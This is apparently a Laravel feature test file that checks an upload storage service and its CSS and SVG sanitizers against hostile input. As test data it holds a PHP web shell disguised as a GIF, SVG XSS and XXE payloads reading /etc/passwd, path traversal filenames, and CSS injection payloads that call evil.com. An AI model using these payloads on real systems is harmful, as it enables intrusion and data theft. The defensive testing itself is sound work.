<?php

namespace Tests\Feature;

use App\Exceptions\InvalidFileException;
use App\Exceptions\InvalidStoragePathException;
use App\Models\Category;
use App\Models\User;
use App\Models\Vendor;
use App\Models\VendorStorageFile;
use App\Services\Security\CssSanitizer;
use App\Services\Security\ImageProcessor;
use App\Services\Security\SvgSanitizer;
use App\Services\StorageService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use InvalidArgumentException;
use Tests\TestCase;

class UploadAndContentSecurityTest extends TestCase
{
    use RefreshDatabase;

    protected Vendor $vendorA;

    protected Vendor $vendorB;

    protected User $ownerA;

    protected User $ownerB;

    protected StorageService $storageService;

    protected SvgSanitizer $svgSanitizer;

    protected CssSanitizer $cssSanitizer;

    protected ImageProcessor $imageProcessor;

    protected function setUp(): void
    {
        parent::setUp();

        Storage::fake('public');

        $this->vendorA = Vendor::create([
            'name' => 'Bistro Alpha',
            'slug' => 'bistro-alpha',
            'email' => 'alpha@test.com',
            'password' => bcrypt('password'),
            'storage_limit_bytes' => 104857600, // 100 MB
            'is_active' => true,
        ]);

        $this->ownerA = User::create([
            'name' => 'Owner Alpha',
            'email' => 'alpha@test.com',
            'password' => bcrypt('password'),
            'vendor_id' => $this->vendorA->id,
            'role' => 'vendor_owner',
        ]);

        $this->vendorB = Vendor::create([
            'name' => 'Bistro Beta',
            'slug' => 'bistro-beta',
            'email' => 'beta@test.com',
            'password' => bcrypt('password'),
            'storage_limit_bytes' => 104857600, // 100 MB
            'is_active' => true,
        ]);

        $this->ownerB = User::create([
            'name' => 'Owner Beta',
            'email' => 'beta@test.com',
            'password' => bcrypt('password'),
            'vendor_id' => $this->vendorB->id,
            'role' => 'vendor_owner',
        ]);

        $this->storageService = app(StorageService::class);
        $this->svgSanitizer = app(SvgSanitizer::class);
        $this->cssSanitizer = app(CssSanitizer::class);
        $this->imageProcessor = app(ImageProcessor::class);
    }

    public function test_mime_spoofing_with_executable_content_disguised_as_image_is_rejected(): void
    {
        $maliciousContent = "GIF89a;\n<?php system(\$_GET['cmd']); ?>";
        $tempPath = tempnam(sys_get_temp_dir(), 'spoof');
        file_put_contents($tempPath, $maliciousContent);

        $fakeFile = new UploadedFile(
            path: $tempPath,
            originalName: 'avatar.jpg',
            mimeType: 'image/jpeg',
            error: null,
            test: true
        );

        $this->expectException(InvalidFileException::class);

        try {
            $this->storageService->store($fakeFile, 'products', $this->vendorA);
        } finally {
            @unlink($tempPath);
        }
    }

    public function test_malicious_svg_with_script_tag_is_rejected(): void
    {
        $maliciousSvg = <<<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script type="text/javascript">
    alert('XSS Script Execution');
  </script>
  <circle cx="50" cy="50" r="40" fill="red" />
</svg>
SVG;

        $tempPath = tempnam(sys_get_temp_dir(), 'svg_test');
        file_put_contents($tempPath, $maliciousSvg);

        $file = new UploadedFile(
            path: $tempPath,
            originalName: 'logo.svg',
            mimeType: 'image/svg+xml',
            error: null,
            test: true
        );

        $this->expectException(InvalidFileException::class);
        $this->expectExceptionMessage('script');

        try {
            $this->storageService->store($file, 'branding', $this->vendorA);
        } finally {
            @unlink($tempPath);
        }
    }

    public function test_malicious_svg_with_inline_event_handler_is_rejected(): void
    {
        $maliciousSvg = <<<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="blue" onload="alert('XSS OnLoad')" />
</svg>
SVG;

        $tempPath = tempnam(sys_get_temp_dir(), 'svg_test2');
        file_put_contents($tempPath, $maliciousSvg);

        $file = new UploadedFile(
            path: $tempPath,
            originalName: 'badge.svg',
            mimeType: 'image/svg+xml',
            error: null,
            test: true
        );

        $this->expectException(InvalidFileException::class);
        $this->expectExceptionMessage('event handler');

        try {
            $this->storageService->store($file, 'branding', $this->vendorA);
        } finally {
            @unlink($tempPath);
        }
    }

    public function test_malicious_svg_with_xxe_payload_is_rejected(): void
    {
        $xxeSvg = <<<'SVG'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text>&xxe;</text>
</svg>
SVG;

        $tempPath = tempnam(sys_get_temp_dir(), 'svg_xxe');
        file_put_contents($tempPath, $xxeSvg);

        $file = new UploadedFile(
            path: $tempPath,
            originalName: 'xxe.svg',
            mimeType: 'image/svg+xml',
            error: null,
            test: true
        );

        $this->expectException(InvalidFileException::class);
        $this->expectExceptionMessage('XML External Entity (XXE)');

        try {
            $this->storageService->store($file, 'branding', $this->vendorA);
        } finally {
            @unlink($tempPath);
        }
    }

    public function test_malicious_svg_with_javascript_uri_is_rejected(): void
    {
        $maliciousSvg = <<<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <a xlink:href="javascript:alert(1)">
    <rect width="100" height="100" fill="gold" />
  </a>
</svg>
SVG;

        $tempPath = tempnam(sys_get_temp_dir(), 'svg_js');
        file_put_contents($tempPath, $maliciousSvg);

        $file = new UploadedFile(
            path: $tempPath,
            originalName: 'link.svg',
            mimeType: 'image/svg+xml',
            error: null,
            test: true
        );

        $this->expectException(InvalidFileException::class);
        $this->expectExceptionMessage('dangerous protocol');

        try {
            $this->storageService->store($file, 'branding', $this->vendorA);
        } finally {
            @unlink($tempPath);
        }
    }

    public function test_svg_is_strictly_disallowed_for_product_images(): void
    {
        $cleanSvg = <<<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" width="50" height="50">
  <rect width="50" height="50" fill="green" />
</svg>
SVG;

        $tempPath = tempnam(sys_get_temp_dir(), 'clean_svg');
        file_put_contents($tempPath, $cleanSvg);

        $file = new UploadedFile(
            path: $tempPath,
            originalName: 'dish.svg',
            mimeType: 'image/svg+xml',
            error: null,
            test: true
        );

        $this->expectException(InvalidFileException::class);
        $this->expectExceptionMessage('SVG format is not allowed for product or gallery images');

        try {
            $this->storageService->store($file, 'products', $this->vendorA);
        } finally {
            @unlink($tempPath);
        }
    }

    public function test_valid_clean_svg_is_sanitized_and_stored_for_branding(): void
    {
        $cleanSvg = <<<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <circle cx="50" cy="50" r="40" fill="#4f46e5" />
  <path d="M 30 50 L 45 65 L 75 35" stroke="#ffffff" stroke-width="6" fill="none" />
</svg>
SVG;

        $tempPath = tempnam(sys_get_temp_dir(), 'valid_svg');
        file_put_contents($tempPath, $cleanSvg);

        $file = new UploadedFile(
            path: $tempPath,
            originalName: 'logo.svg',
            mimeType: 'image/svg+xml',
            error: null,
            test: true
        );

        $record = $this->storageService->store($file, 'branding', $this->vendorA);
        @unlink($tempPath);

        $this->assertInstanceOf(VendorStorageFile::class, $record);
        $this->assertStringEndsWith('.svg', $record->path);
        Storage::disk('public')->assertExists($record->path);

        $storedXml = Storage::disk('public')->get($record->path);
        $this->assertStringContainsString('<circle', $storedXml);
        $this->assertStringNotContainsString('<script', $storedXml);
    }

    public function test_path_traversal_in_filename_is_rejected(): void
    {
        $tempPath = tempnam(sys_get_temp_dir(), 'trav');
        file_put_contents($tempPath, 'dummy');

        $file = new UploadedFile(
            path: $tempPath,
            originalName: '..%2f..%2fetc%2fpasswd.jpg',
            mimeType: 'image/jpeg',
            error: null,
            test: true
        );

        $this->expectException(InvalidStoragePathException::class);
        $this->expectExceptionMessage('Path traversal detected');

        try {
            $this->storageService->store($file, 'products', $this->vendorA);
        } finally {
            @unlink($tempPath);
        }
    }

    public function test_path_traversal_in_clean_path_is_blocked(): void
    {
        $this->expectException(InvalidStoragePathException::class);
        $this->expectExceptionMessage('Path traversal is strictly prohibited');

        $this->storageService->cleanPath('../../../secrets.env');
    }

    public function test_executable_file_extensions_are_rejected(): void
    {
        $file = UploadedFile::fake()->create('backdoor.phtml', 500, 'application/x-httpd-php');

        $this->expectException(InvalidFileException::class);
        $this->expectExceptionMessage('Execution-risk file extension');

        $this->storageService->store($file, 'products', $this->vendorA);
    }

    public function test_oversized_files_exceeding_size_limit_are_rejected(): void
    {
        // Limit is 15 MB
        $oversizedFile = UploadedFile::fake()->create('large.pdf', 16000, 'application/pdf'); // 16 MB

        $this->expectException(InvalidFileException::class);
        $this->expectExceptionMessage('File size exceeds maximum allowable limit');

        $this->storageService->store($oversizedFile, 'documents', $this->vendorA);
    }

    public function test_invalid_or_corrupted_raster_images_are_rejected(): void
    {
        $corruptBytes = "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00CORRUPT_BYTES_TRUNCATED_BODY";
        $tempPath = tempnam(sys_get_temp_dir(), 'corrupt');
        file_put_contents($tempPath, $corruptBytes);

        $fakeFile = new UploadedFile(
            path: $tempPath,
            originalName: 'corrupt.jpg',
            mimeType: 'image/jpeg',
            error: null,
            test: true
        );

        $this->expectException(InvalidFileException::class);
        $this->expectExceptionMessage('Invalid or corrupted image content');

        try {
            $this->storageService->store($fakeFile, 'products', $this->vendorA);
        } finally {
            @unlink($tempPath);
        }
    }

    public function test_cross_vendor_file_access_and_deletion_are_blocked(): void
    {
        $fileB = UploadedFile::fake()->image('b_dish.jpg', 300, 300);
        $recordB = $this->storageService->store($fileB, 'products', $this->vendorB);

        Storage::disk('public')->assertExists($recordB->path);

        // Vendor A attempts to delete Vendor B's file
        $this->expectException(InvalidStoragePathException::class);

        try {
            $this->storageService->delete($recordB, $this->vendorA);
        } finally {
            // File must still be intact on disk
            Storage::disk('public')->assertExists($recordB->path);
        }
    }

    public function test_raster_images_are_reencoded_server_side(): void
    {
        $file = UploadedFile::fake()->image('fresh_pizza.jpg', 400, 300);

        $record = $this->storageService->store($file, 'products', $this->vendorA);

        Storage::disk('public')->assertExists($record->path);
        $this->assertEquals($this->vendorA->id, $record->vendor_id);
        $this->assertEquals('image/jpeg', $record->mime_type);

        // Verify stored file is a genuine readable image
        $savedContent = Storage::disk('public')->get($record->path);
        $gd = @imagecreatefromstring($savedContent);
        $this->assertNotFalse($gd);
        $this->assertEquals(400, imagesx($gd));
        $this->assertEquals(300, imagesy($gd));
        imagedestroy($gd);
    }

    public function test_css_injection_tag_breakout_is_neutralized(): void
    {
        $maliciousCss = 'body { color: red; } </style><script>alert("pwned")</script><style> h1 { font-size: 2rem; }';

        $sanitized = $this->cssSanitizer->sanitize($maliciousCss);

        $this->assertStringNotContainsString('</style', $sanitized);
        $this->assertStringNotContainsString('<script', $sanitized);
        $this->assertStringNotContainsString('</script>', $sanitized);
        $this->assertStringNotContainsString('<', $sanitized);
        $this->assertStringNotContainsString('>', $sanitized);
        $this->assertStringContainsString('color: red;', $sanitized);
        $this->assertStringContainsString('font-size: 2rem;', $sanitized);
    }

    public function test_css_injection_javascript_schemes_and_expressions_are_removed(): void
    {
        $maliciousCss = <<<'CSS'
.banner {
    background-image: url('javascript:alert(1)');
    color: expression(alert(2));
    -moz-binding: url('http://evil.com/xbl');
    behavior: url(evil.htc);
}
@import url('https://evil.com/leak.css');
CSS;

        $sanitized = $this->cssSanitizer->sanitize($maliciousCss);

        $this->assertStringNotContainsString('javascript:', $sanitized);
        $this->assertStringNotContainsString('expression(', $sanitized);
        $this->assertStringNotContainsString('-moz-binding:', $sanitized);
        $this->assertStringNotContainsString('behavior:', $sanitized);
        $this->assertStringNotContainsString('@import', $sanitized);
    }

    public function test_custom_css_length_limit_is_enforced(): void
    {
        $hugeCss = str_repeat('p { margin: 0; } ', 1000); // > 10,000 chars

        $this->expectException(InvalidArgumentException::class);
        $this->expectExceptionMessage('Custom CSS exceeds the maximum allowable length');

        $this->cssSanitizer->sanitize($hugeCss);
    }

    public function test_vendor_saving_hook_automatically_sanitizes_custom_css(): void
    {
        $this->vendorA->update([
            'custom_css' => 'body { background: black; } </style><script>alert(1)</script>',
        ]);

        $this->vendorA->refresh();

        $this->assertStringNotContainsString('<script>', $this->vendorA->custom_css);
        $this->assertStringNotContainsString('</style>', $this->vendorA->custom_css);
        $this->assertStringContainsString('background: black;', $this->vendorA->sanitized_custom_css);
    }

    public function test_storefront_themes_safely_render_sanitized_custom_css(): void
    {
        $this->vendorA->update([
            'custom_css' => 'h2 { color: #10b981; } </style><img src=x onerror=alert(1)>',
            'theme_mode' => 'dark',
        ]);

        Category::create([
            'vendor_id' => $this->vendorA->id,
            'name' => 'Desserts',
            'is_active' => true,
        ]);

        $response = $this->get('/m/'.$this->vendorA->slug);

        $response->assertStatus(200);
        $content = $response->getContent();

        // Must not contain injected tags
        $this->assertStringNotContainsString('<img src=x', $content);
        $this->assertStringNotContainsString('onerror=alert(1)', $content);

        // Must contain legitimate CSS inside <style>
        $this->assertStringContainsString('color: #10b981;', $content);
    }
}
